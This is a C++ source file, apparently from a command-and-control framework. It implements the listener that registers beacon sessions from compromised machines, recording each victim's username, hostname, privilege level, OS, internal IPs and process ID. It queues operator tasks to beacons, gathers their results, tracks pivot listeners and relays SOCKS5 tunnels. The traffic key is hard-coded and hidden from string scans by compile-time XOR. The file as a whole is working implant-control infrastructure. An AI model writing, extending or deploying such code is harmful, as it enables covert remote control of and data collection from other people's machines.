#include "Listener.hpp"

#include <algorithm>
#include <cctype>
#include <optional>

#ifdef __linux__
#include <unistd.h>
#elif _WIN32
#include <Windows.h>

#define INFO_BUFFER_SIZE 32767
#define  ENV_VAR_STRING_COUNT  (sizeof(envVarStrings)/sizeof(TCHAR*))

#endif

// XOR encrypted at compile time, so don't appear in string
constexpr std::string_view _KeyTraficEncryption_ = "dfsdgferhzdzxczevre5595485sdg";
constexpr std::string_view mainKeyConfig = ".CRT$XCL";

// compile time encryption
constexpr std::array<char, 29> _EncryptedKeyTraficEncryption_ = compileTimeXOR<29, 8>(_KeyTraficEncryption_, mainKeyConfig);

#ifdef BUILD_TEAMSERVER
namespace
{
spdlog::level::level_enum levelFromString(const std::string& levelStr, spdlog::level::level_enum fallback)
{
        std::string lowered = levelStr;
        std::transform(lowered.begin(), lowered.end(), lowered.begin(), [](unsigned char c)
        {
                return static_cast<char>(std::tolower(c));
        });

        if(lowered == "trace")
                return spdlog::level::trace;
        if(lowered == "debug")
                return spdlog::level::debug;
        if(lowered == "info")
                return spdlog::level::info;
        if(lowered == "warning" || lowered == "warn")
                return spdlog::level::warn;
        if(lowered == "error")
                return spdlog::level::err;
        if(lowered == "fatal" || lowered == "critical")
                return spdlog::level::critical;

        return fallback;
}
}

spdlog::level::level_enum Listener::resolveLogLevel(const nlohmann::json& globalConfig,
                                                    const nlohmann::json* listenerConfig,
                                                    spdlog::level::level_enum fallback)
{
        auto readLevel = [](const nlohmann::json& cfg) -> std::optional<std::string>
        {
                auto it = cfg.find("LogLevel");
                if(it != cfg.end() && it->is_string())
                        return it->get<std::string>();
                return std::nullopt;
        };

        if(listenerConfig)
        {
                if(auto level = readLevel(*listenerConfig))
                        return levelFromString(*level, fallback);
        }

        if(auto level = readLevel(globalConfig))
                return levelFromString(*level, fallback);

        return fallback;
}
#endif


Listener::Listener(const std::string& param1, const std::string& param2, const std::string& type)
{    
    m_param1 = param1;
    m_param2 = param2;
    m_type = type;
    m_isPrimary = false;

    // m_listenerHash is now composed of a UUID and information related to the machine and the listener
#ifdef __linux__

    char hostname[2048];
    gethostname(hostname, 2048);
    m_hostname = hostname;

#elif _WIN32

    TCHAR  infoBuf[INFO_BUFFER_SIZE];
    DWORD  bufCharCount = INFO_BUFFER_SIZE;

    // Get and display the name of the computer.
    m_hostname = "unknown";
    if( GetComputerName( infoBuf, &bufCharCount ) )
        m_hostname = infoBuf;

#endif
    // TODO take from config ???
    // decrypt key
    std::string keyDecrypted(std::begin(_EncryptedKeyTraficEncryption_), std::end(_EncryptedKeyTraficEncryption_));
    std::string key(mainKeyConfig);
    XOR(keyDecrypted, key);

        m_key=keyDecrypted;
}


const std::string & Listener::getParam1() const
{
    return m_param1;
}


const std::string & Listener::getParam2() const
{
    return m_param2;
}


const std::string & Listener::getType() const
{
    return m_type;
}


const std::string & Listener::getListenerHash() const
{
    return m_listenerHash;
}


std::size_t Listener::getNumberOfSession() const
{
        return m_sessions.size();
}


std::shared_ptr<Session> Listener::getSessionPtr(int idxSession)
{
    std::lock_guard<std::mutex> lock(m_mutex);

    if(idxSession<m_sessions.size())
    {
        std::shared_ptr<Session> ptr = m_sessions[idxSession];
        return ptr;
    }
    else 
        return nullptr;
}


std::shared_ptr<Session> Listener::getSessionPtr(const std::string& beaconHash, const std::string& listenerHash)
{
    std::lock_guard<std::mutex> lock(m_mutex);


        for(std::size_t idxSession=0; idxSession<m_sessions.size(); idxSession++)
    {
        if (beaconHash == m_sessions[idxSession]->getBeaconHash() && listenerHash == m_sessions[idxSession]->getListenerHash())
        {
            std::shared_ptr<Session> ptr = m_sessions[idxSession];
            return ptr;
        }
    }
    return nullptr;
}


bool Listener::isSessionExist(const std::string& beaconHash, const std::string& listenerHash)
{
    std::lock_guard<std::mutex> lock(m_mutex);

        bool sessionExist = false;
        for(auto it = m_sessions.begin() ; it != m_sessions.end(); ++it )
        {
                if (beaconHash == (*it)->getBeaconHash() && listenerHash == (*it)->getListenerHash())
                {
                        sessionExist=true;
                        break;
                }
        }
        return sessionExist;
}

bool Listener::updateSessionProofOfLife(const std::string& beaconHash, std::string& lastProofOfLife)
{
    std::lock_guard<std::mutex> lock(m_mutex);

        bool sessionExist = false;
        for(auto it = m_sessions.begin() ; it != m_sessions.end(); ++it )
        {
                if (beaconHash == (*it)->getBeaconHash())
                {
                        sessionExist=true;
                        (*it)->updatePoofOfLife(lastProofOfLife);
                        break;
                }
        }
        return sessionExist;
}


// Adds a listener to an existing session based on the beacon's hash.
// Returns true if the session was found and the listener was added, false otherwise.
bool Listener::addSessionListener(const std::string& beaconHash, const std::string& listenerHash, const std::string& type, const std::string& param1, const std::string& param2)
{
    // Ensure thread-safe access to the sessions list.
    std::lock_guard<std::mutex> lock(m_mutex);

        bool sessionExist = false;

        // Iterate through all active sessions to find the one matching the given beacon hash.
        for(auto it = m_sessions.begin() ; it != m_sessions.end(); ++it )
        {
                if (beaconHash == (*it)->getBeaconHash())
                {
                        sessionExist=true;

                        // Add the listener to the matching session if it doesn't already exist.
                        (*it)->addListener(listenerHash, type, param1, param2);
#ifdef BUILD_TEAMSERVER
                        if(m_logger)
                                m_logger->info("Listener {} registered child listener {} ({})", beaconHash, listenerHash, type);
#endif
                        break;
                }
        }

#ifdef BUILD_TEAMSERVER
        if(!sessionExist && m_logger)
                m_logger->warn("Unable to register listener {} for beacon {} - session not found", listenerHash, beaconHash);
#endif

        // Return true if the session was found and updated, false otherwise.
        return sessionExist;
}


bool Listener::rmSessionListener(const std::string& beaconHash, const std::string& listenerHash)
{
    std::lock_guard<std::mutex> lock(m_mutex);

        bool sessionExist = false;
        for(auto it = m_sessions.begin() ; it != m_sessions.end(); ++it )
        {
                if (beaconHash == (*it)->getBeaconHash())
                {
                        sessionExist=true;
                        (*it)->rmListener(listenerHash);
#ifdef BUILD_TEAMSERVER
                        if(m_logger)
                                m_logger->info("Removed listener {} from beacon {}", listenerHash, beaconHash);
#endif
                        break;
                }
        }
#ifdef BUILD_TEAMSERVER
        if(!sessionExist && m_logger)
                m_logger->warn("Unable to remove listener {} for beacon {} - session not found", listenerHash, beaconHash);
#endif
        return sessionExist;
}


std::vector<SessionListener> Listener::getSessionListenerInfos()
{
    std::vector<SessionListener> sessionListenerList;
    for(auto it = m_sessions.begin() ; it != m_sessions.end(); ++it )
    {
        if(!(*it)->isSessionKilled())
            sessionListenerList.insert(sessionListenerList.end(), (*it)->getListener().begin(), (*it)->getListener().end());
    }
    return sessionListenerList;
}


bool Listener::markSessionKilled(const std::string& beaconHash)
{
    std::lock_guard<std::mutex> lock(m_mutex);

        bool sessionExist = false;
        for(auto it = m_sessions.begin() ; it != m_sessions.end(); ++it )
        {
                if (beaconHash == (*it)->getBeaconHash())
                {
                        sessionExist=true;
                        (*it)->setSessionKilled();
#ifdef BUILD_TEAMSERVER
                        if(m_logger)
                                m_logger->info("Marked session for beacon {} as terminated", beaconHash);
#endif
                        break;
                }
        }
        return sessionExist;
}


void Listener::queueTask(const std::string& beaconHash, const C2Message& c2Message)
{
    addTask(c2Message, beaconHash);
}


bool Listener::addTask(const C2Message& task, const std::string& beaconHash)
{
    std::lock_guard<std::mutex> lock(m_mutex);

        bool sessionExist = false;
        for(auto it = m_sessions.begin() ; it != m_sessions.end(); ++it )
        {
                if (beaconHash == (*it)->getBeaconHash())
                {
                        sessionExist=true;
                        (*it)->addTask(task);
#ifdef BUILD_TEAMSERVER
                        if(m_logger && m_logger->should_log(spdlog::level::debug))
                                m_logger->debug("Queued task for beacon {}", beaconHash);
#endif
                        break;
                }
        }
#ifdef BUILD_TEAMSERVER
        if(!sessionExist && m_logger)
                m_logger->warn("Failed to queue task for beacon {} - session not found", beaconHash);
#endif
        return sessionExist;
}


C2Message Listener::getTask(const std::string& beaconHash)
{
    std::lock_guard<std::mutex> lock(m_mutex);

        C2Message output;
        for(auto it = m_sessions.begin() ; it != m_sessions.end(); ++it )
        {
                if (beaconHash == (*it)->getBeaconHash())
                {
                        output = (*it)->getTask();
                        break;
                }
        }

        return output;
}


bool Listener::addTaskResult(const C2Message& taskResult, const std::string& beaconHash)
{
    std::lock_guard<std::mutex> lock(m_mutex);

        bool sessionExist = false;
        for(auto it = m_sessions.begin() ; it != m_sessions.end(); ++it )
        {
                if (beaconHash == (*it)->getBeaconHash())
                {
                        sessionExist=true;
                        (*it)->addTaskResult(taskResult);
#ifdef BUILD_TEAMSERVER
                        if(m_logger)
                                m_logger->info("Received task result for beacon {}", beaconHash);
#endif
                        break;
                }
        }
#ifdef BUILD_TEAMSERVER
        if(!sessionExist && m_logger)
                m_logger->warn("Failed to add task result for beacon {} - session not found", beaconHash);
#endif
        return sessionExist;
}


C2Message Listener::getTaskResult(const std::string& beaconHash)
{
    std::lock_guard<std::mutex> lock(m_mutex);

        C2Message output;
        for(auto it = m_sessions.begin() ; it != m_sessions.end(); ++it )
        {
                if (beaconHash == (*it)->getBeaconHash())
                {
                        output = (*it)->getTaskResult();
                        break;
                }
        }

        return output;
}


bool Listener::isSocksSessionExist(const std::string& beaconHash, const std::string& listenerHash)
{
    std::lock_guard<std::mutex> lock(m_mutex);

        bool isSessionExist = false;
        for(auto it = m_socksSessions.begin() ; it != m_socksSessions.end(); ++it )
        {
                if (beaconHash == (*it)->getBeaconHash() && listenerHash == (*it)->getListenerHash())
                {
                        isSessionExist=true;
                        break;
                }
        }
        return isSessionExist;
}


bool Listener::addSocksTaskResult(const C2Message& taskResult, const std::string& beaconHash)
{
    std::lock_guard<std::mutex> lock(m_mutex);

        bool sessionExist = false;
        for(auto it = m_socksSessions.begin() ; it != m_socksSessions.end(); ++it )
        {
                if (beaconHash == (*it)->getBeaconHash())
                {
                        sessionExist=true;
                        (*it)->addTaskResult(taskResult);
#ifdef BUILD_TEAMSERVER
                        if(m_logger && m_logger->should_log(spdlog::level::debug))
                                m_logger->debug("Queued socks task result for beacon {}", beaconHash);
#endif
                        break;
                }
        }
#ifdef BUILD_TEAMSERVER
        if(!sessionExist && m_logger)
                m_logger->warn("Failed to queue socks task result for beacon {} - session not found", beaconHash);
#endif
        return sessionExist;
}


C2Message Listener::getSocksTaskResult(const std::string& beaconHash)
{
    std::lock_guard<std::mutex> lock(m_mutex);

        C2Message output;
        for(auto it = m_socksSessions.begin() ; it != m_socksSessions.end(); ++it )
        {
                if (beaconHash == (*it)->getBeaconHash())
                {
                        output = (*it)->getTaskResult();
                        break;
                }
        }

        return output;
}


// Main function of the listener
// input is the message send by the beacon to the listener
// output is the message send by listener to the beacon
bool Listener::handleMessages(const std::string& input, std::string& output)
{
    std::string data = base64_decode(input);
    XOR(data, m_key);

    // Mutli Sessions, Multi messages
    MultiBundleC2Message multiBundleC2Message;
    multiBundleC2Message.ParseFromArray(data.data(), (int)data.size());

    //
    // 1) Handle messages comming from beacons
    //
    // Create taksResult to be display by the TeamServer
    for (int k = 0; k < multiBundleC2Message.bundlec2messages_size(); k++) 
    {
        // For each session (direct session and childs)
        BundleC2Message* bundleC2Message = multiBundleC2Message.bundlec2messages(k);

        // Sessions are unique and created from the pair beaconHash / first listenerHash handling the request
        // If listenerHash is already filled it means that the session was already handled by an other listener befor this one
        std::string beaconHash = bundleC2Message->beaconhash();
        std::string listenerhash = bundleC2Message->listenerhash();
        if(listenerhash.empty())
            listenerhash = getListenerHash();
        bundleC2Message->set_listenerhash(listenerhash);

        if(beaconHash.size()!=SizeBeaconHash)
            continue;

        bool isExist = isSessionExist(beaconHash, listenerhash);

        // If the session does not exist, create a new one
                if(isExist==false)
                {
                        // TODO if no info are provided, queu a getInfo cmd
#ifdef BUILD_TEAMSERVER
                        if(m_logger)
                                m_logger->info("Registering new session for beacon {} handled by listener {}", beaconHash, listenerhash);
#endif

            std::string username = bundleC2Message->username();
            std::string hostname = bundleC2Message->hostname();
            std::string arch = bundleC2Message->arch();
            std::string privilege = bundleC2Message->privilege();
            std::string os = bundleC2Message->os();
            std::string internalIps = bundleC2Message->internalIps();
            std::string processId = bundleC2Message->processId();
            std::string additionalInformation = bundleC2Message->additionalInformation();

                        std::shared_ptr<Session> session = std::make_shared<Session>(listenerhash, beaconHash, hostname, username, arch, privilege, os);
                        session->setInternalIps(internalIps);
                        session->setProcessId(processId);
                        session->setAdditionalInformation(additionalInformation);
                        m_sessions.push_back(std::move(session));
        }
        // If the session already exist, update the information
        else
        {
            std::string lastProofOfLife = bundleC2Message->lastProofOfLife();
                        updateSessionProofOfLife(beaconHash, lastProofOfLife);
        }

        // For each message in this session
        for (int j = 0; j < bundleC2Message->c2messages_size(); j++) 
        {
            const C2Message& c2Message = bundleC2Message->c2messages(j);

                        addTaskResult(c2Message, beaconHash);

            // Handle instruction that have impact on this Listener
            // Here if a beacon is terminated, we need to remove the list of sessions associeted with it.
            if(c2Message.instruction()==EndCmd)
            {
                markSessionKilled(beaconHash);
                
                                std::size_t nbSession = getNumberOfSession();
                                for(std::size_t kk=0; kk<nbSession; kk++)
                                {
                                        std::shared_ptr<Session> sessions = getSessionPtr(kk);
                                        std::vector<SessionListener> sessionListenerList;
                                        sessionListenerList.insert(sessionListenerList.end(), sessions->getListener().begin(), sessions->getListener().end());
                                        for (std::size_t j = 0; j < sessionListenerList.size(); j++)
                                        {
                                                rmSessionListener(beaconHash, sessionListenerList[j].getListenerHash());
                                        }
                                }
            }    
            // Handle socks5 messages
            // Check if the listener is primary - meaning launched by the teamserver. Otherwise don't do this and just relay the task to the next listener
            else if(c2Message.instruction()==Socks5Cmd && m_isPrimary)
            {
                                bool isExist = isSocksSessionExist(beaconHash, listenerhash);
                                if(isExist==false)
                                {
                                        std::shared_ptr<SocksSession> session = std::make_shared<SocksSession>(listenerhash, beaconHash);
                                        m_socksSessions.push_back(std::move(session));
#ifdef BUILD_TEAMSERVER
                                        if(m_logger)
                                                m_logger->info("Created socks session for beacon {} via listener {}", beaconHash, listenerhash);
#endif
                                }

                addSocksTaskResult(c2Message, beaconHash);
            }
            // Handle return instruction sent to beacon to start/stop listeners
            else if(c2Message.instruction()==ListenerCmd)
            {
                std::string cmd = c2Message.cmd();
                std::vector<std::string> splitedCmd;
                std::string delimiter = " ";
                splitList(cmd, delimiter, splitedCmd);

                if(splitedCmd[0]==StartCmd)
                {
                    std::string listenerMetadata = c2Message.data();
                    std::string listenerHash = c2Message.returnvalue();

                    nlohmann::json parsed;
                    try
                    {
                        parsed = nlohmann::json::parse(listenerMetadata);
                        std::string type = parsed["1"];
                        std::string param1 = parsed["2"];
                        std::string param2 = parsed["3"];

                        addSessionListener(beaconHash, listenerHash, type, param1, param2);
                    } 
                    catch (...)
                    {
                        continue;
                    }
                }
                else if(splitedCmd[0]==StopCmd)
                {
                    rmSessionListener(beaconHash, c2Message.returnvalue());
                }
            }
            // Handle proof of life of listeners
            else if(c2Message.instruction()==ListenerPollCmd)
            {                    
                std::string listenerMetadata = c2Message.data();
                std::string listenerHash = c2Message.returnvalue();

                nlohmann::json parsed;
                try
                {
                    parsed = nlohmann::json::parse(listenerMetadata);
                    std::string type = parsed["1"];
                    std::string param1 = parsed["2"];
                    std::string param2 = parsed["3"];

                    addSessionListener(beaconHash, listenerHash, type, param1, param2);
                } 
                catch (...)
                {
                    continue;
                }
            }
        }
        
    }

    //
    // 2) Handle commands to send to Beacons
    //
    // For every beacons contacting the listener, check if their are tasks to be sent and create a message to send it
    bool isTaskToSend=false;
    MultiBundleC2Message multiBundleC2MessageRet;
    for (int k = 0; k < multiBundleC2Message.bundlec2messages_size(); k++) 
    {
        BundleC2Message* bundleC2Message = multiBundleC2Message.bundlec2messages(k);

        // Sessions are unique and created from the pair beaconHash / listenerHash
        // If listenerHash is already filled it means that the session was already handled by other listener befor this one
        std::string beaconHash = bundleC2Message->beaconhash();
        if(beaconHash.size()!=SizeBeaconHash)
            continue;
        
        // Look for tasks in the queue for the this beacon
        C2Message c2Message = getTask(beaconHash);
        if(!c2Message.instruction().empty())
        {
            isTaskToSend=true;
            BundleC2Message *bundleC2Message = multiBundleC2MessageRet.add_bundlec2messages();
            bundleC2Message->set_beaconhash(beaconHash);


            while(!c2Message.instruction().empty())
            {
                C2Message *addedC2MessageRet = bundleC2Message->add_c2messages();
                addedC2MessageRet->CopyFrom(c2Message);
                c2Message = getTask(beaconHash);    
            }    
        }
        
    }

    data="";
    if(isTaskToSend)
        multiBundleC2MessageRet.SerializeToString(&data);

    if (data.empty())
        data = "{}";

    XOR(data, m_key);
    output = base64_encode(data);

    return isTaskToSend;
}